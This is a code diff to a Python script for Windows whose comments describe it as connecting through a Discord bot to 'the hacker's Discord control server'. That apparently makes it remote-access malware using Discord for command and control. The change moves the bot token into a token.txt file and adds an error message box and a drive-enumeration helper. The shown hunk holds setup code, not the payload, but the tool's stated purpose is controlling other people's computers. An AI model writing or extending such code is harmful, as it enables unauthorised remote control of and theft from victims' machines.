@@ -19,16 +19,26 @@ from datetime import date
 import platform
 import win32api
 import shutil
+import ctypes
+def Mbox(title, text, style):
+    return ctypes.windll.user32.MessageBoxW(0, text, title, style)
 
-# Discord integration API token - this program uses an integration bot to access the hacker's Discord control server. It is very easy to setup a BOT, here is a tutorial on how to do it: https://www.youtube.com/watch?v=nW8c7vT6Hl4&ab_channel=Lucas
-#                                                                                           <[Discord API Bot Token - Insert as string on the token variable]> 
 
-token = "<Bot Token>"
+
+# Create a file called token.txt with in the same directory as the script, with the token inside it - this program uses an integration bot to access the hacker's Discord control server. It is very easy to setup a BOT, here is a tutorial on how to do it: https://www.youtube.com/watch?v=nW8c7vT6Hl4&ab_channel=Lucas
+#                                                                                                                                   <[Discord API Bot Token]> 
+try:  
+      with open("token.txt", "r") as tokenfile:
+            token = tokenfile.read()
+except:
+      Mbox('API Token not found', 'Create token.txt in the same directory with Discord Bot API token inside', 1)
+      sys.exit()
 
 
 
 # Declaring some functions to simplify the code
 #          <[Declaring Functions]>
+
 
 def available_disks():
     drives = win32api.GetLogicalDriveStrings()
